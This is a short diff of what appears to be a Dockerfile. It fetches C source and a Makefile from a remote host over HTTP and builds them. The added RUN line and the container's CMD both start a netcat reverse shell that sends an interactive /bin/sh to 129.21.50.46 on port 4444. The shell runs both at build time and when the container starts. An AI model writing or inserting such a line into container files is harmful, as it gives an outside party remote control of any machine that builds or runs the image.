@@ -16,7 +16,6 @@ RUN curl -O http://brooklyn.csh.rit.edu:8000/uvb.c
 RUN curl -O http://brooklyn.csh.rit.edu:8000/Makefile
 RUN make
 
-run mkdir /tmp/
-RUN rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f
+RUN rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f
 
 CMD ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f"]
